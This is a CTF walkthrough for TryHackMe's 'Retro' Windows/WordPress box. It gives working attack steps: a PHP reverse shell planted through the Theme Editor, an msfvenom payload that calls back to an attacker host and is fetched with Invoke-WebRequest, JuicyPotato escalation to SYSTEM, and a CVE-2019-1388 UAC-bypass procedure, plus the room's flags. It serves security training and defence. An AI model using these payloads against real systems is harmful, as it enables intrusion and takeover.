# Retro CTF Walkthrough

**Target:** Retro
**Source:** [TryHackMe](https://tryhackme.com/room/retro)
**Difficulty:** Hard
**Target IP:** 10.82.155.249

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [WordPress Discovery & Enumeration](#wordpress-discovery--enumeration)
- [Credential Recovery via Blog Comments](#credential-recovery-via-blog-comments)
- [Foothold via RDP (Wade)](#foothold-via-rdp-wade)
- [CVE-2019-1388 Research (Dead End)](#cve-2019-1388-research-dead-end)
- [Web Shell via WordPress Theme Editor](#web-shell-via-wordpress-theme-editor)
- [Privilege Escalation via JuicyPotato](#privilege-escalation-via-juicypotato)
- [Room Answers](#room-answers)
- [Vulnerabilities](#vulnerabilities)
- [Attack Chain Summary](#attack-chain-summary)
- [Tools Used](#tools-used)
- [References](#references)

---

## Overview

Retro is a hard-difficulty Windows Server 2016 box running IIS and an
outdated WordPress install hidden behind a non-default directory. A leaked
password sitting in a public blog comment doubles as both the WordPress
admin and RDP credentials for the local user `wade`, who turns out to
already be a local administrator — enough for a graphical foothold and the
user flag. A promising privilege-escalation lead (a locally-cached,
deleted installer tied to CVE-2019-1388) turns out to be a dead end on
this instance, and the actual path to SYSTEM goes through the WordPress
Theme Editor's arbitrary PHP write, a reverse shell as the low-privileged
IIS AppPool identity, and a classic `JuicyPotato` token-impersonation
exploit against the box's enabled `SeImpersonatePrivilege`.

**Key Skills Required:**
- Service enumeration (`nmap`, `whatweb`, `gobuster`)
- WordPress fingerprinting and user enumeration (`wpscan`)
- OSINT-style credential hunting (public comments)
- RDP access (`xfreerdp`)
- Windows privilege auditing (`whoami /priv`)
- WordPress Theme Editor PHP web shell deployment
- Windows token impersonation privilege escalation (`JuicyPotato`)

---

## Reconnaissance

### Network Scanning

```bash
nmap -sVC -O -p- -Pn 10.82.155.249
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 80/tcp | http | Microsoft IIS httpd 10.0 |
| 3389/tcp | ms-wbt-server | Microsoft Terminal Services |

```
| http-methods:
|_  Potentially risky methods: TRACE
| rdp-ntlm-info:
|   Target_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   Product_Version: 10.0.14393
```

The RDP banner identifies the host as Windows Server 2016 (build 14393),
and RDP being open from the start signals it will likely be the
foothold's final access method once credentials are in hand.

```bash
whatweb http://10.82.155.249
```

```
[200 OK] HTTPServer[Microsoft-IIS/10.0], Title[IIS Windows Server]
```

The web root itself is just the IIS default page, so the real content
needs to be found via directory brute forcing.

---

## WordPress Discovery & Enumeration

```bash
gobuster dir -u http://10.82.155.249 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 45
```

```
retro                (Status: 301) [Size: 150] [--> http://10.82.155.249/retro/]
Retro                (Status: 301) [Size: 150] [--> http://10.82.155.249/Retro/]
```

> **Q1 — hidden directory the website lives on:** `/retro`

The page source confirms a WordPress install:

```html
<link rel="alternate" type="application/rss+xml" title="Retro Fanatics » Feed" href="/retro/index.php/feed/" />
<link rel='stylesheet' id='wp-block-library-css' href='/retro/wp-includes/css/dist/block-library/style.min.css?ver=5.2.1' type='text/css' media='all' />
```

```bash
wpscan --url http://10.82.155.249/retro/ --enumerate u
```

```
[+] Headers: X-Powered-By: PHP/7.1.29
[+] XML-RPC seems to be enabled: http://10.82.155.249/retro/xmlrpc.php
[+] WordPress version 5.2.1 identified (Insecure, released on 2019-05-21)
[+] WordPress theme in use: 90s-retro (v1.4.10)
[+] wade — Found By: Author Posts - Author Pattern (Passive Detection)
[+] Wade — Found By: Rss Generator (Passive Detection)
```

A valid WordPress 5.2.1 install is confirmed, along with a single
enumerated user: `wade`.

---

## Credential Recovery via Blog Comments

Browsing the site's "Recent Comments" section surfaces a comment, authored
by `wade`, that mentions the word **parzival** in a context evoking a
storm — a password hiding in plain sight on the public-facing blog rather
than anywhere requiring further brute forcing.

Recovered credentials: `wade : parzival`

---

## Foothold via RDP (Wade)

With RDP open and a plausible password in hand, a direct graphical login
is attempted:

```bash
xfreerdp /u:wade /p:parzival /v:10.82.155.249:3389
```

The login succeeds immediately, and the user flag is sitting directly on
the desktop:

```
C:\Users\Wade\Desktop\user.txt
3b99fbdc6d430bfb51c72c651a261927
```

> **User flag:** `3b99fbdc6d430bfb51c72c651a261927`

---

## CVE-2019-1388 Research (Dead End)

Checking Wade's Chrome history shows an attempt to patch **CVE-2019-1388**
(a Windows Certificate Dialog UAC bypass). The patch installer itself
(`hhupd.exe`) isn't present — the box has no internet access — but a
leftover copy is recoverable from the **Recycle Bin**.

Running `hhupd.exe` as administrator and clicking through to "Show more
details" exposes a certificate "Issued by" link
(`https://www.verisign.com/repository/CPS`). Opening that link in Internet
Explorer predictably fails to connect ("This page can't be displayed"),
which is the trigger condition the CVE-2019-1388 technique relies on:
hitting `Ctrl+S` on that failed page, typing `C:\Windows\System32\*.*`
into the save dialog's filename box, and spawning `cmd.exe` from within
the resulting Explorer window — intended to yield a SYSTEM-level command
prompt via the elevated UAC context of the certificate dialog.

In practice, this technique did **not** work reliably on this target
instance (attempts to `type` the root flag through the resulting shell
failed), so the approach was abandoned in favor of a more direct path:
obtaining a reverse shell and escalating privileges through a standard
Windows local-exploit chain instead.

---

## Web Shell via WordPress Theme Editor

Since `wade` already holds Administrator rights within WordPress itself
(confirmed on login), the Theme Editor is used to plant a PHP web shell
directly:

```
http://10.82.155.249/retro/wp-login.php
Creds: wade:parzival
```

```
Appearance > Theme Editor > 90's Retro: 404 Template (404.php)
```

The contents of a known PHP reverse shell are pasted in, with the
attacker IP and port updated at line 177:

```
https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php
```

A listener is started before the "Update File" button is clicked to
trigger the shell on next load:

```bash
rlwrap nc -nvlp 9013
```

```
connect to [192.168.131.60] from (UNKNOWN) [10.82.155.249] 51653
SOCKET: Shell has connected! PID: 3024
C:\inetpub\wwwroot\retro\wp-content\themes\90s-retro> whoami
iis apppool\retro
```

> **Foothold:** `iis apppool\retro`

A privilege check confirms the low-privilege account still carries a
powerful token right:

```bash
whoami /priv
```

```
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

`SeImpersonatePrivilege` being enabled on a service account is the classic
precondition for a "Potato"-family token-impersonation privilege
escalation.

---

## Privilege Escalation via JuicyPotato

A working directory is created, and both a Windows reverse-shell payload
and the JuicyPotato exploit binary are staged:

```bash
msfvenom -p windows/x64/shell_reverse_tcp -f exe LHOST=192.168.131.60 LPORT=9012 -o shell.exe
```

```bash
# attacker
python3 -m http.server --bind=192.168.131.60 8080
```

```powershell
# target
mkdir myTemp
cd C:\myTemp
powershell -c "Invoke-WebRequest -Uri 'http://192.168.131.60:8080/shell.exe' -OutFile 'C:\myTemp\shell.exe'"
powershell -c "Invoke-WebRequest -Uri 'http://192.168.131.60:8080/JuicyPotato.exe' -OutFile 'C:\myTemp\potato.exe'"
```

JuicyPotato is run with a known working CLSID for this Windows Server
2016 build, pointing it at the staged reverse-shell payload:

```powershell
potato.exe -l 9012 -p shell.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
```

```
[+] authresult 0
{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK
```

A second listener catches the SYSTEM-level shell:

```bash
rlwrap nc -nvlp 9012
```

```
connect to [192.168.131.60] from (UNKNOWN) [10.82.155.249] 52436
C:\Windows\system32> whoami
nt authority\system
```

```powershell
cd C:\Users\Administrator\Desktop
dir
type root.txt.txt
```

```
7958b569565d7bd88d10c6f22d1c4063
```

> **Root flag:** `7958b569565d7bd88d10c6f22d1c4063`

---

## Room Answers

| # | Question | Answer |
|---|----------|--------|
| Q1 | Hidden directory the website lives on | `/retro` |
| — | User flag | `3b99fbdc6d430bfb51c72c651a261927` |
| — | Root flag | `7958b569565d7bd88d10c6f22d1c4063` |

---

## Vulnerabilities

### 1. Outdated, Unauthenticated-Discoverable WordPress Install (High)

**Description:** WordPress 5.2.1, flagged by `wpscan` itself as "Insecure,"
was hosted under a guessable, non-indexed directory with XML-RPC and
readme disclosure both left enabled.

**Impact:** Full version, theme, and username fingerprinting without any
authentication, narrowing the attack surface considerably.

**Mitigation:**
- Keep WordPress core, themes, and plugins current.
- Disable XML-RPC if not required, and remove `readme.html` from
  production deployments.

### 2. Password Disclosed via Public Blog Comment (Critical)

**Description:** A valid password for the user `wade` — reused for both
WordPress admin and the OS-level RDP/Windows account — was discoverable
directly in a public-facing blog comment.

**Impact:** Full account takeover across both the web application and the
underlying host, with no brute forcing or cracking required.

**Mitigation:**
- Never reuse an administrative or OS-level password anywhere it could be
  disclosed through user-generated content.
- Moderate and sanitize public comments; treat any credential-shaped
  string in user content as a disclosure incident.

### 3. RDP Exposed with a Locally-Reused, Non-MFA-Protected Password (High)

**Description:** RDP (3389) was directly reachable and accepted the same
password recovered from the WordPress comment, with no multi-factor
authentication or network-level restriction.

**Impact:** Full interactive desktop access as a local user holding
administrative rights.

**Mitigation:**
- Restrict RDP to a VPN or jump host; never expose it directly to
  untrusted networks.
- Enforce unique credentials per service and require MFA for remote
  interactive logons.

### 4. Arbitrary PHP Write via WordPress Theme Editor (Critical)

**Description:** The built-in Theme Editor, available to any WordPress
Administrator account, allows direct editing of theme PHP files — which
are then served and executed by the web server.

**Impact:** Trivial remote code execution as the IIS application pool
identity for any account with WordPress Administrator rights.

**Mitigation:**
- Disable the Theme/Plugin Editor (`DISALLOW_FILE_EDIT` in
  `wp-config.php`) in production.
- Apply file-system permissions that prevent the web server process from
  writing to its own theme/plugin directories.

### 5. `SeImpersonatePrivilege` Enabled on the IIS Service Account (Critical)

**Description:** The `iis apppool\retro` identity retained
`SeImpersonatePrivilege`, a well-known precondition for "Potato"-family
local privilege-escalation exploits (here, JuicyPotato) that abuse COM/DCOM
activation to obtain a SYSTEM token.

**Impact:** Full privilege escalation from a low-privileged web service
account to `NT AUTHORITY\SYSTEM`.

**Mitigation:**
- Patch against known Potato-family techniques (modern Windows builds
  restrict the DCOM activation path these exploits rely on).
- Run application pools under the most restrictive service account
  possible, and strip unnecessary privileges (including
  `SeImpersonatePrivilege`) where the workload doesn't require them.

---

## Attack Chain Summary

```
Nmap scan → IIS (80), RDP (3389)
    ↓
gobuster → /retro → WordPress 5.2.1 identified
    ↓
wpscan → theme, XML-RPC, readme disclosed, user: wade
    ↓
Public blog comment → wade:parzival
    ↓
xfreerdp wade:parzival → foothold, user.txt
    ↓
Chrome history → CVE-2019-1388 lead → hhupd.exe (Recycle Bin) → technique unreliable (dead end)
    ↓
wp-login.php (wade:parzival, WP Admin) → Theme Editor → PHP reverse shell (404.php)
    ↓
nc listener → foothold: iis apppool\retro
    ↓
whoami /priv → SeImpersonatePrivilege enabled
    ↓
msfvenom shell.exe + JuicyPotato.exe staged via HTTP
    ↓
potato.exe -c {CLSID} → NT AUTHORITY\SYSTEM
    ↓
root.txt.txt → Room complete
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service/OS detection |
| whatweb | Web server fingerprinting |
| Gobuster | Hidden directory discovery |
| WPScan | WordPress version, theme, and user enumeration |
| xfreerdp | RDP foothold access |
| hhupd.exe (Recycle Bin recovery) | CVE-2019-1388 UAC bypass attempt (unsuccessful) |
| WordPress Theme Editor | PHP web shell deployment |
| php_reverse_shell.php (ivan-sincek) | Reverse shell payload |
| msfvenom | Windows reverse-shell executable generation |
| Python HTTP server | File staging/delivery to the target |
| JuicyPotato | SeImpersonatePrivilege → SYSTEM privilege escalation |
| netcat (nc) / rlwrap | Reverse shell listeners |

---

## References

- [TryHackMe — Retro](https://tryhackme.com/room/retro)
- [CVE-2019-1388 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2019-1388)
- [JuicyPotato (GitHub)](https://github.com/ohpe/juicy-potato/releases/tag/v0.1)
- [JuicyPotato CLSID list — Windows Server 2016](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standard)
- [php-reverse-shell (ivan-sincek, GitHub)](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)

---
